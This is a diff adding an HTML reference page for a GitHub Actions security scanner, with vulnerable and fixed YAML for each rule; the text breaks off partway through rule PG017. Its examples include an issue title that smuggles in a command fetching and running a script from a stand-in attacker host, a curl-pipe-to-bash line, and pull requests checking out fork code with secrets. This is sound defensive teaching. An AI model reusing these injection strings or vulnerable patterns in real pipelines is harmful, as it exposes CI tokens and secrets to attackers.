@@ -1,0 +1,710 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>GitHub Actions Security Rules (36 Checks with Fixes) | PipelineGuard</title>
+  <meta name="description" content="How to fix pull_request_target pwn requests, script injection, unpinned actions, leaked secrets, self-hosted runner risks and over-broad GITHUB_TOKEN permissions in GitHub Actions. Vulnerable and fixed YAML for each.">
+  <meta name="author" content="Yousaf Hamza (Yousaf K Hamza)">
+  <link rel="canonical" href="https://yousafkhamza.github.io/pipelineguard/rules/">
+  <meta name="theme-color" content="#1B2428">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; style-src 'self'; font-src 'self'; img-src 'self' data:; base-uri 'self'; form-action 'none'">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="PipelineGuard">
+  <meta property="og:title" content="GitHub Actions security rules, with fixes">
+  <meta property="og:description" content="36 checks for GitHub Actions workflows, each with vulnerable and fixed YAML. By Yousaf Hamza.">
+  <meta property="og:url" content="https://yousafkhamza.github.io/pipelineguard/rules/">
+  <meta property="og:image" content="https://yousafkhamza.github.io/pipelineguard/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml">
+  <link rel="preload" href="../assets/fonts/big-shoulders-display-latin-900-normal.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="preload" href="../assets/fonts/archivo-latin-400-normal.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="stylesheet" href="../assets/css/fonts.css">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"GitHub Actions security rules: pwn requests, script injection, unpinned actions and more","description":"Reference for all 36 PipelineGuard checks, each with a vulnerable and a fixed GitHub Actions example.","url":"https://yousafkhamza.github.io/pipelineguard/rules/","dateModified":"2026-11-18","inLanguage":"en","author":{"@type":"Person","name":"Yousaf Hamza","alternateName":"Yousaf K Hamza","url":"https://yousafkhamza.github.io/"},"isPartOf":{"@type":"WebSite","name":"PipelineGuard","url":"https://yousafkhamza.github.io/pipelineguard/"},"hasPart":[{"@type":"WebPageElement","name":"PG001: Untrusted pull request code runs with a privileged token","url":"https://yousafkhamza.github.io/pipelineguard/rules/#pwn-request-checkout"},{"@type":"WebPageElement","name":"PG002: Attacker-controlled text is pasted straight into a shell script","url":"https://yousafkhamza.github.io/pipelineguard/rules/#script-injection"},{"@type":"WebPageElement","name":"PG003: Action is referenced by a movable tag or branch","url":"https://yousafkhamza.github.io/pipelineguard/rules/#unpinned-action"},{"@type":"WebPageElement","name":"PG004: GITHUB_TOKEN permissions are not restricted","url":"https://yousafkhamza.github.io/pipelineguard/rules/#broad-token-permissions"},{"@type":"WebPageElement","name":"PG005: Secret is interpolated directly into a run script","url":"https://yousafkhamza.github.io/pipelineguard/rules/#secret-in-script"},{"@type":"WebPageElement","name":"PG006: Credential is committed in the workflow file","url":"https://yousafkhamza.github.io/pipelineguard/rules/#hardcoded-credential"},{"@type":"WebPageElement","name":"PG007: Remote script is piped straight into a shell","url":"https://yousafkhamza.github.io/pipelineguard/rules/#curl-pipe-shell"},{"@type":"WebPageElement","name":"PG008: Deprecated set-env / add-path commands are re-enabled","url":"https://yousafkhamza.github.io/pipelineguard/rules/#unsecure-commands"},{"@type":"WebPageElement","name":"PG009: Self-hosted runner accepts pull request jobs","url":"https://yousafkhamza.github.io/pipelineguard/rules/#self-hosted-on-pr"},{"@type":"WebPageElement","name":"PG010: actions/checkout leaves the token in .git/config","url":"https://yousafkhamza.github.io/pipelineguard/rules/#checkout-persists-credentials"},{"@type":"WebPageElement","name":"PG011: Container image is not pinned to a digest","url":"https://yousafkhamza.github.io/pipelineguard/rules/#unpinned-container-image"},{"@type":"WebPageElement","name":"PG012: Privileged workflow trusts artifacts from an untrusted run","url":"https://yousafkhamza.github.io/pipelineguard/rules/#artifact-poisoning"},{"@type":"WebPageElement","name":"PG013: Job has no timeout","url":"https://yousafkhamza.github.io/pipelineguard/rules/#missing-timeout"},{"@type":"WebPageElement","name":"PG014: Reusable workflow receives every secret","url":"https://yousafkhamza.github.io/pipelineguard/rules/#secrets-inherit"},{"@type":"WebPageElement","name":"PG015: Anyone can trigger this job by commenting","url":"https://yousafkhamza.github.io/pipelineguard/rules/#unguarded-comment-trigger"},{"@type":"WebPageElement","name":"PG016: Privileged trigger without explicit permissions","url":"https://yousafkhamza.github.io/pipelineguard/rules/#privileged-trigger"},{"@type":"WebPageElement","name":"PG017: Manual workflow input is pasted into a shell script","url":"https://yousafkhamza.github.io/pipelineguard/rules/#dispatch-input-injection"},{"@type":"WebPageElement","name":"PG018: Step or job output is pasted into a shell script","url":"https://yousafkhamza.github.io/pipelineguard/rules/#step-output-injection"},{"@type":"WebPageElement","name":"PG019: if: condition is always true","url":"https://yousafkhamza.github.io/pipelineguard/rules/#always-true-if"},{"@type":"WebPageElement","name":"PG020: Password or token is passed as plain text to an action","url":"https://yousafkhamza.github.io/pipelineguard/rules/#literal-credential-input"},{"@type":"WebPageElement","name":"PG021: GITHUB_TOKEN is written into a run script","url":"https://yousafkhamza.github.io/pipelineguard/rules/#github-token-in-script"},{"@type":"WebPageElement","name":"PG022: TLS certificate checks are turned off","url":"https://yousafkhamza.github.io/pipelineguard/rules/#tls-verification-disabled"},{"@type":"WebPageElement","name":"PG023: Shell tracing is on in a step that has secrets","url":"https://yousafkhamza.github.io/pipelineguard/rules/#trace-with-secrets"},{"@type":"WebPageElement","name":"PG024: Whole workspace is uploaded as an artifact","url":"https://yousafkhamza.github.io/pipelineguard/rules/#artifact-uploads-workspace"},{"@type":"WebPageElement","name":"PG025: Cache is used in a privileged workflow","url":"https://yousafkhamza.github.io/pipelineguard/rules/#cache-in-privileged-workflow"},{"@type":"WebPageElement","name":"PG026: Uses the removed set-output / save-state commands","url":"https://yousafkhamza.github.io/pipelineguard/rules/#deprecated-workflow-command"},{"@type":"WebPageElement","name":"PG027: Action is archived and no longer maintained","url":"https://yousafkhamza.github.io/pipelineguard/rules/#archived-action"},{"@type":"WebPageElement","name":"PG028: Job targets a retired runner image","url":"https://yousafkhamza.github.io/pipelineguard/rules/#retired-runner-image"},{"@type":"WebPageElement","name":"PG029: Action had a publicly reported compromise","url":"https://yousafkhamza.github.io/pipelineguard/rules/#previously-compromised-action"},{"@type":"WebPageElement","name":"PG030: Action name looks like a typo of a popular action","url":"https://yousafkhamza.github.io/pipelineguard/rules/#typosquatted-action"},{"@type":"WebPageElement","name":"PG031: Container runs with --privileged or the Docker socket","url":"https://yousafkhamza.github.io/pipelineguard/rules/#privileged-container"},{"@type":"WebPageElement","name":"PG032: Dependencies are installed without the lockfile","url":"https://yousafkhamza.github.io/pipelineguard/rules/#unlocked-dependency-install"},{"@type":"WebPageElement","name":"PG033: OIDC id-token: write is granted to the whole workflow","url":"https://yousafkhamza.github.io/pipelineguard/rules/#broad-oidc-permission"},{"@type":"WebPageElement","name":"PG034: Deploy workflow can run twice at the same time","url":"https://yousafkhamza.github.io/pipelineguard/rules/#deploy-without-concurrency"},{"@type":"WebPageElement","name":"PG035: workflow_run trigger has no branch filter","url":"https://yousafkhamza.github.io/pipelineguard/rules/#workflow-run-any-branch"},{"@type":"WebPageElement","name":"PG036: Security or test step is allowed to fail silently","url":"https://yousafkhamza.github.io/pipelineguard/rules/#unchecked-failure"}]}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"PipelineGuard","item":"https://yousafkhamza.github.io/pipelineguard/"},{"@type":"ListItem","position":2,"name":"Rules","item":"https://yousafkhamza.github.io/pipelineguard/rules/"}]}</script>
+</head>
+<body>
+  <a class="skip" href="#rules">Skip to the rules</a>
+  <header class="masthead">
+    <div class="wrap masthead__inner">
+      <a class="wordmark" href="../" aria-label="PipelineGuard home">
+        <svg class="wordmark__icon" viewBox="0 0 32 32" aria-hidden="true"><rect x="1" y="12" width="30" height="8" rx="1.5" fill="currentColor"/><rect x="11" y="9" width="10" height="14" rx="1.5" fill="#EFC12B" stroke="currentColor" stroke-width="2"/><rect x="15" y="2" width="2" height="8" fill="currentColor"/><rect x="9" y="1" width="14" height="3" rx="1.5" fill="currentColor"/></svg>
+        <span>PipelineGuard</span>
+      </a>
+      <nav class="nav" aria-label="Main">
+        <a href="../#scanner">Scanner</a>
+        <a href="./" aria-current="page">Rules</a>
+        <a href="../#ci">Use in CI</a>
+        <a href="https://github.com/yousafkhamza/pipelineguard" rel="noopener">GitHub</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <section class="page-head wrap">
+      <h1>GitHub Actions security rules</h1>
+      <p>Every check PipelineGuard runs, what the attack looks like, and the change that closes it. Each rule shows a vulnerable workflow next to a fixed one you can copy.</p>
+      <p><a class="link" href="../#scanner">Scan your own workflow</a></p>
+    </section>
+    <div class="rulepage wrap" id="rules">
+      <nav class="rulepage__toc" aria-label="Rules">
+        <ol>
+          <li><a href="#pwn-request-checkout" class="sev-critical"><span>PG001</span>Untrusted pull request code runs with a privileged token</a></li>
+          <li><a href="#script-injection" class="sev-high"><span>PG002</span>Attacker-controlled text is pasted straight into a shell script</a></li>
+          <li><a href="#unpinned-action" class="sev-medium"><span>PG003</span>Action is referenced by a movable tag or branch</a></li>
+          <li><a href="#broad-token-permissions" class="sev-medium"><span>PG004</span>GITHUB_TOKEN permissions are not restricted</a></li>
+          <li><a href="#secret-in-script" class="sev-medium"><span>PG005</span>Secret is interpolated directly into a run script</a></li>
+          <li><a href="#hardcoded-credential" class="sev-critical"><span>PG006</span>Credential is committed in the workflow file</a></li>
+          <li><a href="#curl-pipe-shell" class="sev-medium"><span>PG007</span>Remote script is piped straight into a shell</a></li>
+          <li><a href="#unsecure-commands" class="sev-high"><span>PG008</span>Deprecated set-env / add-path commands are re-enabled</a></li>
+          <li><a href="#self-hosted-on-pr" class="sev-high"><span>PG009</span>Self-hosted runner accepts pull request jobs</a></li>
+          <li><a href="#checkout-persists-credentials" class="sev-low"><span>PG010</span>actions/checkout leaves the token in .git/config</a></li>
+          <li><a href="#unpinned-container-image" class="sev-low"><span>PG011</span>Container image is not pinned to a digest</a></li>
+          <li><a href="#artifact-poisoning" class="sev-high"><span>PG012</span>Privileged workflow trusts artifacts from an untrusted run</a></li>
+          <li><a href="#missing-timeout" class="sev-info"><span>PG013</span>Job has no timeout</a></li>
+          <li><a href="#secrets-inherit" class="sev-low"><span>PG014</span>Reusable workflow receives every secret</a></li>
+          <li><a href="#unguarded-comment-trigger" class="sev-medium"><span>PG015</span>Anyone can trigger this job by commenting</a></li>
+          <li><a href="#privileged-trigger" class="sev-medium"><span>PG016</span>Privileged trigger without explicit permissions</a></li>
+          <li><a href="#dispatch-input-injection" class="sev-medium"><span>PG017</span>Manual workflow input is pasted into a shell script</a></li>
+          <li><a href="#step-output-injection" class="sev-low"><span>PG018</span>Step or job output is pasted into a shell script</a></li>
+          <li><a href="#always-true-if" class="sev-high"><span>PG019</span>if: condition is always true</a></li>
+          <li><a href="#literal-credential-input" class="sev-high"><span>PG020</span>Password or token is passed as plain text to an action</a></li>
+          <li><a href="#github-token-in-script" class="sev-medium"><span>PG021</span>GITHUB_TOKEN is written into a run script</a></li>
+          <li><a href="#tls-verification-disabled" class="sev-medium"><span>PG022</span>TLS certificate checks are turned off</a></li>
+          <li><a href="#trace-with-secrets" class="sev-medium"><span>PG023</span>Shell tracing is on in a step that has secrets</a></li>
+          <li><a href="#artifact-uploads-workspace" class="sev-medium"><span>PG024</span>Whole workspace is uploaded as an artifact</a></li>
+          <li><a href="#cache-in-privileged-workflow" class="sev-medium"><span>PG025</span>Cache is used in a privileged workflow</a></li>
+          <li><a href="#deprecated-workflow-command" class="sev-low"><span>PG026</span>Uses the removed set-output / save-state commands</a></li>
+          <li><a href="#archived-action" class="sev-low"><span>PG027</span>Action is archived and no longer maintained</a></li>
+          <li><a href="#retired-runner-image" class="sev-low"><span>PG028</span>Job targets a retired runner image</a></li>
+          <li><a href="#previously-compromised-action" class="sev-medium"><span>PG029</span>Action had a publicly reported compromise</a></li>
+          <li><a href="#typosquatted-action" class="sev-high"><span>PG030</span>Action name looks like a typo of a popular action</a></li>
+          <li><a href="#privileged-container" class="sev-medium"><span>PG031</span>Container runs with --privileged or the Docker socket</a></li>
+          <li><a href="#unlocked-dependency-install" class="sev-low"><span>PG032</span>Dependencies are installed without the lockfile</a></li>
+          <li><a href="#broad-oidc-permission" class="sev-low"><span>PG033</span>OIDC id-token: write is granted to the whole workflow</a></li>
+          <li><a href="#deploy-without-concurrency" class="sev-info"><span>PG034</span>Deploy workflow can run twice at the same time</a></li>
+          <li><a href="#workflow-run-any-branch" class="sev-low"><span>PG035</span>workflow_run trigger has no branch filter</a></li>
+          <li><a href="#unchecked-failure" class="sev-low"><span>PG036</span>Security or test step is allowed to fail silently</a></li>
+        </ol>
+      </nav>
+      <div>
+        <article class="rule sev-critical" id="pwn-request-checkout">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--critical">Critical</span><span class="finding__id">PG001, pwn-request-checkout</span></div>
+            <h2>Untrusted pull request code runs with a privileged token</h2>
+            <p>The workflow is triggered by <code>pull_request_target</code> or <code>workflow_run</code>, which run with write access and secrets, and then checks out the pull request's own code. Anything in that fork (a build script, a package.json hook, a Makefile) now runs with your token. This is the classic &quot;pwn request&quot;.</p>
+            <p><b>How to fix it.</b> Use the plain <code>pull_request</code> trigger for anything that builds or tests contributor code. If you need a privileged follow-up (labelling, commenting), split it into a second workflow that never checks out the PR head.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>on: pull_request_target
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm install &amp;&amp; npm test</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>on: pull_request
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm ci &amp;&amp; npm test</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-high" id="script-injection">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--high">High</span><span class="finding__id">PG002, script-injection</span></div>
+            <h2>Attacker-controlled text is pasted straight into a shell script</h2>
+            <p>An expression like <code>${{ github.event.issue.title }}</code> is expanded into the script before the shell sees it. A title such as a&quot;; curl evil.sh | sh; # becomes code. Issue titles, PR bodies, branch names, commit messages and comments are all attacker-controlled.</p>
+            <p><b>How to fix it.</b> Pass the value through an environment variable and reference it as a quoted shell variable. The shell then treats it as data, never as code.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: echo &quot;New issue: ${{ github.event.issue.title }}&quot;</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- env:
+    TITLE: ${{ github.event.issue.title }}
+  run: echo &quot;New issue: $TITLE&quot;</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="unpinned-action">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG003, unpinned-action</span></div>
+            <h2>Action is referenced by a movable tag or branch</h2>
+            <p>Tags like @v3 and branches like @main can be moved to new code at any time. If the action's repository is compromised (as happened with tj-actions/changed-files in 2025), every workflow using the tag runs the attacker's version on its next run.</p>
+            <p><b>How to fix it.</b> Pin to a full 40-character commit SHA and keep the version in a comment so Dependabot or Renovate can still update it.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- uses: some-org/deploy-action@v2</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- uses: some-org/deploy-action@8f4b7f84864484a7bf31766abe9204da3cbe65b3 # v2.1.0</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="broad-token-permissions">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG004, broad-token-permissions</span></div>
+            <h2>GITHUB_TOKEN permissions are not restricted</h2>
+            <p>Without a permissions block, the token inherits the repository default, which on many older repos and orgs is read/write to everything. <code>write-all</code> is worse. Any compromised step can then push code, publish releases or edit issues.</p>
+            <p><b>How to fix it.</b> Set <code>permissions: contents: read</code> at the top of the workflow and grant extra scopes per job, only where needed.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>name: build
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>name: build
+on: push
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="secret-in-script">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG005, secret-in-script</span></div>
+            <h2>Secret is interpolated directly into a run script</h2>
+            <p><code>${{ secrets.X }}</code> inside run: writes the secret's value into the generated script file on the runner. It also breaks if the secret contains quotes, and echoing it can defeat log masking when the value is transformed.</p>
+            <p><b>How to fix it.</b> Expose the secret through env: and reference it as a variable. Never echo, print or base64 a secret.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: echo &quot;${{ secrets.DEPLOY_TOKEN }}&quot; | docker login -u me --password-stdin</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- env:
+    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+  run: printf '%s' &quot;$DEPLOY_TOKEN&quot; | docker login -u me --password-stdin</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-critical" id="hardcoded-credential">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--critical">Critical</span><span class="finding__id">PG006, hardcoded-credential</span></div>
+            <h2>Credential is committed in the workflow file</h2>
+            <p>The file contains something that looks like a real AWS key, GitHub token, Slack token, OpenAI/Anthropic key or private key. Anyone who can read the repository, and its git history, can use it.</p>
+            <p><b>How to fix it.</b> Revoke the credential now, then move it to repository or environment secrets. For cloud access, prefer OIDC (aws-actions/configure-aws-credentials with role-to-assume) so there is no long-lived key at all.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>env:
+  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>permissions:
+  id-token: write
+  contents: read
+steps:
+  - uses: aws-actions/configure-aws-credentials@&lt;sha&gt;
+    with:
+      role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
+      aws-region: me-central-1</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="curl-pipe-shell">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG007, curl-pipe-shell</span></div>
+            <h2>Remote script is piped straight into a shell</h2>
+            <p>curl … | bash runs whatever the server returns at that moment, unverified. If the host or the DNS is hijacked, your runner (and its token) belongs to someone else.</p>
+            <p><b>How to fix it.</b> Download to a file, verify a pinned checksum or signature, then execute. Better still, use a pinned action or package manager.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: curl -sL https://get.example.sh | bash</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- run: |
+    curl -sLo install.sh https://get.example.sh
+    echo &quot;3b1c…e9  install.sh&quot; | sha256sum -c -
+    bash install.sh</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-high" id="unsecure-commands">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--high">High</span><span class="finding__id">PG008, unsecure-commands</span></div>
+            <h2>Deprecated set-env / add-path commands are re-enabled</h2>
+            <p><code>ACTIONS_ALLOW_UNSECURE_COMMANDS</code> turns back on the ::set-env:: and ::add-path:: log commands GitHub disabled in 2020. Any step that prints attacker text to the log can then inject environment variables such as LD_PRELOAD or NODE_OPTIONS.</p>
+            <p><b>How to fix it.</b> Remove the variable and write to the $GITHUB_ENV and $GITHUB_PATH files instead.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>env:
+  ACTIONS_ALLOW_UNSECURE_COMMANDS: true</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- run: echo &quot;TOOL_HOME=/opt/tool&quot; &gt;&gt; &quot;$GITHUB_ENV&quot;</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-high" id="self-hosted-on-pr">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--high">High</span><span class="finding__id">PG009, self-hosted-on-pr</span></div>
+            <h2>Self-hosted runner accepts pull request jobs</h2>
+            <p>A pull request from a fork can run arbitrary code on a self-hosted runner. Unlike GitHub-hosted runners, it is not thrown away after the job, so an attacker can persist, read other jobs' secrets or reach your internal network.</p>
+            <p><b>How to fix it.</b> Run untrusted PR jobs on GitHub-hosted runners. If you must use self-hosted, use ephemeral runners (for example actions-runner-controller with ephemeral pods) and require approval for fork PRs.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>on: pull_request
+jobs:
+  test:
+    runs-on: [self-hosted, linux]</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>on: pull_request
+jobs:
+  test:
+    runs-on: ubuntu-latest</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="checkout-persists-credentials">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG010, checkout-persists-credentials</span></div>
+            <h2>actions/checkout leaves the token in .git/config</h2>
+            <p>By default actions/checkout writes the <code>GITHUB_TOKEN</code> into the local git config so later steps can push. Every later step, including third-party actions and uploaded artifacts of the workspace, can read it.</p>
+            <p><b>How to fix it.</b> Set <code>persist-credentials: false</code> unless a later step really needs to push.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- uses: actions/checkout@v4</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- uses: actions/checkout@v4
+  with:
+    persist-credentials: false</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="unpinned-container-image">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG011, unpinned-container-image</span></div>
+            <h2>Container image is not pinned to a digest</h2>
+            <p>Images referenced by tag (or with no tag, which means latest) can be replaced in the registry. The job silently runs whatever was pushed last.</p>
+            <p><b>How to fix it.</b> Reference the image by digest: image@sha256:…, and keep the tag in a comment.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>container:
+  image: node:latest</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>container:
+  image: node@sha256:2b1c6f2a…  # node:22.11-bookworm</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-high" id="artifact-poisoning">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--high">High</span><span class="finding__id">PG012, artifact-poisoning</span></div>
+            <h2>Privileged workflow trusts artifacts from an untrusted run</h2>
+            <p>A <code>workflow_run</code> job downloads artifacts produced by a pull request build. The fork controls those artifacts, so extracting them over your workspace, sourcing them or writing them to $GITHUB_ENV hands the fork code execution with your secrets.</p>
+            <p><b>How to fix it.</b> Download artifacts into a dedicated directory, treat every byte as untrusted data, validate it (for example, parse a number with a strict regex) and never execute or source it.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>on:
+  workflow_run:
+    workflows: [ci]
+    types: [completed]
+jobs:
+  report:
+    steps:
+      - uses: actions/download-artifact@v4
+      - run: cat pr.env &gt;&gt; &quot;$GITHUB_ENV&quot;</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- uses: actions/download-artifact@v4
+  with:
+    path: ${{ runner.temp }}/untrusted
+- run: |
+    PR=$(cat &quot;$RUNNER_TEMP/untrusted/pr-number&quot;)
+    [[ &quot;$PR&quot; =~ ^[0-9]+$ ]] || exit 1</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-info" id="missing-timeout">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--info">Info</span><span class="finding__id">PG013, missing-timeout</span></div>
+            <h2>Job has no timeout</h2>
+            <p>Jobs default to a 6-hour timeout. A hung step burns runner minutes (or a self-hosted machine) for hours before anyone notices.</p>
+            <p><b>How to fix it.</b> Set <code>timeout-minutes</code> on every job to a sensible ceiling, such as 2–3× its normal duration.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>jobs:
+  build:
+    runs-on: ubuntu-latest</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="secrets-inherit">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG014, secrets-inherit</span></div>
+            <h2>Reusable workflow receives every secret</h2>
+            <p><code>secrets: inherit</code> forwards all repository, org and environment secrets to the called workflow, not just the ones it needs. If that workflow or one of its actions is compromised, everything leaks.</p>
+            <p><b>How to fix it.</b> Pass only the secrets the called workflow declares.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>jobs:
+  deploy:
+    uses: org/platform/.github/workflows/deploy.yml@&lt;sha&gt;
+    secrets: inherit</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>jobs:
+  deploy:
+    uses: org/platform/.github/workflows/deploy.yml@&lt;sha&gt;
+    secrets:
+      KUBE_CONFIG: ${{ secrets.KUBE_CONFIG }}</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="unguarded-comment-trigger">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG015, unguarded-comment-trigger</span></div>
+            <h2>Anyone can trigger this job by commenting</h2>
+            <p><code>issue_comment</code> and <code>discussion_comment</code> workflows run for every commenter, including people with no access to the repository. ChatOps commands such as /deploy or /release must check who is asking.</p>
+            <p><b>How to fix it.</b> Gate the job on the commenter's association with the repository.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>on: issue_comment
+jobs:
+  deploy:
+    if: contains(github.event.comment.body, '/deploy')</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>on: issue_comment
+jobs:
+  deploy:
+    if: &gt;-
+      contains(github.event.comment.body, '/deploy') &amp;&amp;
+      contains(fromJSON('[&quot;OWNER&quot;,&quot;MEMBER&quot;]'), github.event.comment.author_association)</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="privileged-trigger">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG016, privileged-trigger</span></div>
+            <h2>Privileged trigger without explicit permissions</h2>
+            <p><code>pull_request_target</code> and <code>workflow_run</code> always run with secrets and, unless restricted, a write token, even when the event came from a fork. Even without checking out fork code today, the next edit to this file could.</p>
+            <p><b>How to fix it.</b> Declare the smallest permissions block that works, and add a comment explaining why the privileged trigger is needed.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>on: pull_request_target
+jobs:
+  label:
+    runs-on: ubuntu-latest</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>on: pull_request_target
+permissions:
+  pull-requests: write
+jobs:
+  label:
+    runs-on: ubuntu-latest</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="dispatch-input-injection">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG017, dispatch-input-injection</span></div>
+            <h2>Manual workflow input is pasted into a shell script</h2>
+            <p><code>${{ inputs.x }}</code> and <code>${{ github.event.inputs.x }}</code> are expanded into the script before the shell runs. Anyone with write access, or a stolen token, can turn an input field into a command.</p>
+            <p><b>How to fix it.</b> Pass inputs through env: and quote the variable. Use type: choice for inputs that only have a few valid values.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: ./deploy.sh ${{ inputs.environment }}</code></pre></figure>
